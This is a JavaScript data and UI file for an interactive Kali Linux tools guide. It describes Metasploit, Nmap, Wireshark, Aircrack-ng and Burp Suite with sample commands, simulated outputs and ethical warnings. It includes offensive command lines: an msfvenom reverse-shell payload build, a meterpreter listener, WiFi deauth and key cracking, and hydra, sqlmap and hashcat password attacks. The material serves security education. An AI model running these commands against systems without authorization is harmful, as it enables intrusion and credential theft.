// Kali Linux Tools Guide - Interactive Script
// Main script for the interactive Kali Linux Tools Guide

// =====================================
// Data Structures
// =====================================

// Tool data - contains all information about the penetration testing tools
const toolsData = [
    {
        id: 'metasploit',
        name: 'Metasploit Framework',
        icon: 'fa-bug',
        category: 'exploitation',
        categoryLabel: 'Exploitation',
        description: 'Advanced open-source platform for developing, testing, and executing exploit code against remote target machines. The framework includes hundreds of professional-grade exploits.',
        difficulty: 'advanced',
        syntax: {
            basic: 'msfconsole',
            advanced: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; set LPORT 4444; run"',
            expert: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe -o payload.exe'
        },
        output: {
            basic: 'Loading configuration from /usr/share/metasploit-framework/config/config...\nStarted the Metasploit Framework console...\n* WARNING: No database support: No database YAML file\n\n       =[ metasploit v6.1.27-dev                          ]\n+ -- --=[ 2205 exploits - 1171 auxiliary - 396 post       ]\n+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]\n+ -- --=[ 9 evasion                                       ]\n\nMSF >',
            advanced: 'Loading configuration from /usr/share/metasploit-framework/config/config...\n[*] Starting the Metasploit Framework console...\n[*] Using configured payload generic/shell_reverse_tcp\nMSF > use exploit/multi/handler\nMSF exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nMSF exploit(multi/handler) > set LHOST 192.168.1.10\nLHOST => 192.168.1.10\nMSF exploit(multi/handler) > set LPORT 4444\nLPORT => 4444\nMSF exploit(multi/handler) > run\n[*] Started reverse TCP handler on 192.168.1.10:4444',
            expert: 'No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo Arch selected, selecting Arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: payload.exe'
        },
        features: [
            { title: 'Version', value: 'v6.1.27' },
            { title: 'Exploits', value: '2200+' },
            { title: 'Language', value: 'Ruby' },
            { title: 'License', value: 'BSD' }
        ],
        parameters: [
            { name: 'LHOST', description: 'Local host address for reverse connections', required: true },
            { name: 'LPORT', description: 'Local port for handler', required: true },
            { name: 'PAYLOAD', description: 'Type of payload to use', required: true },
            { name: 'RHOST', description: 'Target host address', required: false },
            { name: 'RPORT', description: 'Target port', required: false }
        ],
        ethicalWarning: 'Metasploit can be used to exploit vulnerabilities in systems without proper authorization. This is illegal in most jurisdictions and could result in criminal charges. Always ensure you have written permission before testing any system.',
        workflow: ['Reconnaissance', 'Scanning', 'Exploitation', 'Post-Exploitation'],
        examples: [
            'use exploit/multi/handler',
            'set PAYLOAD windows/meterpreter/reverse_tcp',
            'search cve:2021 type:exploit',
            'db_nmap -sV 192.168.1.0/24'
        ]
    },
    {
        id: 'nmap',
        name: 'Nmap',
        icon: 'fa-network-wired',
        category: 'reconnaissance',
        categoryLabel: 'Reconnaissance',
        description: 'Network Mapper is a free and open-source utility for network discovery and security auditing. Nmap uses raw IP packets to determine what hosts are available on the network, what services they are offering, what OS they are running, and dozens of other characteristics.',
        difficulty: 'basic',
        syntax: {
            basic: 'nmap 192.168.1.1',
            advanced: 'nmap -sV -sC -p- -T4 192.168.1.0/24',
            expert: 'nmap -sS -sV -sC --script vuln -p- -A -T4 -oA nmap_scan 192.168.1.0/24'
        },
        output: {
            basic: 'Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-20 12:00 UTC\nNmap scan report for router.lan (192.168.1.1)\nHost is up (0.0023s latency).\nNot shown: 995 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n53/tcp   open  domain\n80/tcp   open  http\n443/tcp  open  https\n8443/tcp open  https-alt\n\nNmap done: 1 IP address (1 host up) scanned in 5.22 seconds',
            advanced: 'Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-20 12:02 UTC\nNmap scan report for router.lan (192.168.1.1)\nHost is up (0.0019s latency).\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 256 IP addresses (8 hosts up) scanned in 185.48 seconds',
            expert: 'Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-20 12:10 UTC\n... [extensive output redacted for brevity] ...\n... [vulnerability findings would be shown here] ...\nNmap done: 256 IP addresses (8 hosts up) scanned in 756.32 seconds'
        },
        features: [
            { title: 'Version', value: '7.92' },
            { title: 'Scan Types', value: '10+' },
            { title: 'Languages', value: 'C, C++, Lua' },
            { title: 'License', value: 'GPL' }
        ],
        parameters: [
            { name: '-sS', description: 'TCP SYN scan (Stealth scan)', required: false },
            { name: '-sV', description: 'Version detection', required: false },
            { name: '-p', description: 'Port specification (e.g., -p 1-100)', required: false },
            { name: '-A', description: 'Aggressive scan (OS detection, version detection, script scanning, traceroute)', required: false },
            { name: '-T', description: 'Timing template (0-5, higher is faster)', required: false }
        ],
        ethicalWarning: 'Port scanning without permission may be illegal in many jurisdictions. You should only scan networks and systems that you own or have explicit permission to test.',
        workflow: ['Target Selection', 'Scan Configuration', 'Scan Execution', 'Analysis'],
        examples: [
            'nmap -sP 192.168.1.0/24',
            'nmap -p 1-65535 192.168.1.1',
            'nmap -sV --script=banner 192.168.1.1',
            'nmap -A 192.168.1.100'
        ]
    },
    {
        id: 'wireshark',
        name: 'Wireshark',
        icon: 'fa-wave-square',
        category: 'forensics',
        categoryLabel: 'Forensics',
        description: 'Wireshark is the world\'s foremost network protocol analyzer. It lets you see what\'s happening on your network at a microscopic level. It is the de facto standard across many industries and educational institutions.',
        difficulty: 'basic',
        syntax: {
            basic: 'wireshark',
            advanced: 'wireshark -i eth0 -k -w capture.pcap',
            expert: 'tshark -i eth0 -f "port 80" -w http_traffic.pcap'
        },
        output: {
            basic: '[GUI application launches]',
            advanced: '[GUI captures network traffic on eth0 interface and saves to capture.pcap]',
            expert: 'Capturing on \'eth0\'\n162 packets captured'
        },
        features: [
            { title: 'Version', value: '3.6.2' },
            { title: 'Protocols', value: '1000+' },
            { title: 'Interface', value: 'GUI/CLI' },
            { title: 'License', value: 'GPL' }
        ],
        parameters: [
            { name: '-i', description: 'Interface to capture from', required: false },
            { name: '-k', description: 'Start capturing immediately', required: false },
            { name: '-w', description: 'File to write packets to', required: false },
            { name: '-f', description: 'Capture filter expression', required: false },
            { name: '-Y', description: 'Display filter expression', required: false }
        ],
        ethicalWarning: 'Capturing and analyzing network traffic without proper authorization may be illegal and a privacy violation. Only monitor networks you own or have explicit permission to monitor.',
        workflow: ['Interface Selection', 'Configure Filters', 'Capture Traffic', 'Analysis'],
        examples: [
            'wireshark -i wlan0',
            'wireshark -r existing_capture.pcap',
            'tshark -i eth0 -f "host 192.168.1.1"',
            'tshark -i eth0 -Y "http.request"'
        ]
    },
    {
        id: 'aircrack-ng',
        name: 'Aircrack-ng',
        icon: 'fa-wifi',
        category: 'wireless-tools',
        categoryLabel: 'Wireless',
        description: 'Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on different areas of WiFi security: monitoring, attacking, testing, and cracking.',
        difficulty: 'advanced',
        syntax: {
            basic: 'aircrack-ng capture.cap',
            advanced: 'airmon-ng start wlan0 && airodump-ng wlan0mon',
            expert: 'airmon-ng start wlan0 && airodump-ng --bssid [MAC] -c [CHANNEL] -w capture wlan0mon && aircrack-ng -w wordlist.txt capture-01.cap'
        },
        output: {
            basic: 'Reading packets, please wait...\nOpening capture.cap\nRead 1827381 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  00:11:22:33:44:55  HomeNetwork               WPA (1 handshake)\n\nAircrack-ng will now start the cracking process...',
            advanced: 'Found 5 processes that could cause trouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to run \'airmon-ng check kill\'\n\n  PID Name\n  623 avahi-daemon\n  624 avahi-daemon\n  832 wpa_supplicant\n  926 NetworkManager\n\nPHY     Interface       Driver          Chipset\n\nphy0    wlan0           iwlwifi         Intel Corporation Wireless 8265 (rev 78)\n\n        (mac80211 monitor mode enabled for [phy0]wlan0 on [phy0]wlan0mon)\n        (mac80211 station mode disabled for [phy0]wlan0)',
            expert: '[Complex multi-step output showing monitor mode activation, network capture with target details, and cracking process]'
        },
        features: [
            { title: 'Suite Tools', value: '13+' },
            { title: 'Supported Cards', value: '100+' },
            { title: 'Key Cracking', value: 'WEP/WPA/WPA2' },
            { title: 'License', value: 'GPL' }
        ],
        parameters: [
            { name: 'interface', description: 'Wireless interface to use', required: true },
            { name: '--bssid', description: 'MAC address of access point', required: false },
            { name: '-c', description: 'Channel of AP', required: false },
            { name: '-w', description: 'Filename prefix for capture', required: false },
            { name: '--ivs', description: 'Save only IVs (WEP)', required: false }
        ],
        ethicalWarning: 'Cracking WiFi networks without explicit permission from the owner is illegal in most jurisdictions and could result in severe penalties. Only test networks you own or have written permission to test.',
        workflow: ['Monitor Mode', 'Network Discovery', 'Packet Capture', 'Key Cracking'],
        examples: [
            'airmon-ng start wlan0',
            'airodump-ng wlan0mon',
            'aireplay-ng --deauth 10 -a [BSSID] wlan0mon',
            'aircrack-ng -w wordlist.txt *.cap'
        ]
    },
    {
        id: 'burpsuite',
        name: 'Burp Suite',
        icon: 'fa-spider',
        category: 'web-apps',
        categoryLabel: 'Web Apps',
        description: 'Burp Suite is an integrated platform for performing security testing of web applications. Its various tools work seamlessly together to support the entire testing process, from initial mapping and analysis to finding and exploiting security vulnerabilities.',
        difficulty: 'advanced',
        syntax: {
            basic: 'burpsuite',
            advanced: 'java -jar burpsuite_pro.jar',
            expert: 'java -jar -Xmx2g burpsuite_pro.jar --project-file=project.burp --config-file=config.json'
        },
        output: {
            basic: '[GUI application launches]',
            advanced: '[Professional version with more features launches]',
            expert: '[Professional version launches with 2GB memory allocation and loads specified project]'
        },
        features: [
            { title: 'Version', value: 'Community/Pro' },
            { title: 'Proxy', value: 'Intercept/Modify' },
            { title: 'Scanner', value: 'Vuln Detection' },
            { title: 'License', value: 'Commercial/Free' }
        ],
        parameters: [
            { name: '-Xmx', description: 'Maximum memory allocation', required: false },
            { name: '--project-file', description: 'Load a specific project file', required: false },
            { name: '--config-file', description: 'Load a specific config file', required: false },
            { name: '--disable-extensions', description: 'Disable loading of extensions', required: false },
            { name: '--diagnostics', description: 'Print diagnostic info', required: false }
        ],
        ethicalWarning: 'Using Burp Suite to test web applications without permission may violate computer crime laws and terms of service agreements. Only test web applications you own or have received explicit permission to test.',
        workflow: ['Configure Proxy', 'Map Application', 'Analyze Traffic', 'Active Testing'],
        examples: [
            'Set browser proxy to 127.0.0.1:8080',
            'Right-click request & send to Repeater',
            'Use Intruder for parameter fuzzing',
            'Check Scanner results for vulnerabilities'
        ]
    }
];

// More tools will be added later in the script

// Terminal example commands
const exampleCommands = [
    { text: 'nmap -sV -sC 192.168.1.1', category: 'reconnaissance' },
    { text: 'sudo wireshark -i eth0 -k', category: 'forensics' },
    { text: 'msfconsole -q', category: 'exploitation' },
    { text: 'airmon-ng start wlan0', category: 'wireless-tools' },
    { text: 'hydra -l admin -P passwords.txt 192.168.1.1 ssh', category: 'password-attacks' },
    { text: 'sqlmap -u "http://example.com/page.php?id=1" --dbs', category: 'web-apps' },
    { text: 'john --wordlist=rockyou.txt hash.txt', category: 'password-attacks' },
    { text: 'hashcat -m 0 -a 0 hash.txt wordlist.txt', category: 'password-attacks' }
];

// =====================================
// DOM Elements
// =====================================
document.addEventListener('DOMContentLoaded', function() {
    // Get main DOM elements
    const toolsGrid = document.getElementById('tools-grid');
    const toolSearch = document.getElementById('tool-search');
    const searchBtn = document.getElementById('search-btn');
    const filterButtons = document.querySelectorAll('.filter-btn');
    const viewButtons = document.querySelectorAll('.view-btn');
    const menuToggle = document.getElementById('menu-toggle');
    const navLinks = document.querySelector('.nav-links');
    const difficultyButtons = document.querySelectorAll('.difficulty-btn');
    const terminalInput = document.getElementById('terminal-input');
    const terminalOutput = document.getElementById('terminal-output');
    const exampleCommandsContainer = document.querySelector('.example-commands');
    const bookmarksContainer = document.getElementById('bookmarks-container');
    const ethicsBanner = document.getElementById('ethics-banner');
    const ethicsDismiss = document.getElementById('ethics-dismiss');
    const ethicsModal = document.getElementById('ethics-modal');
    const ethicsCheckbox = document.getElementById('ethics-checkbox');
    const ethicsAgree = document.getElementById('ethics-agree');
    const closeModal = document.querySelector('.close-modal');
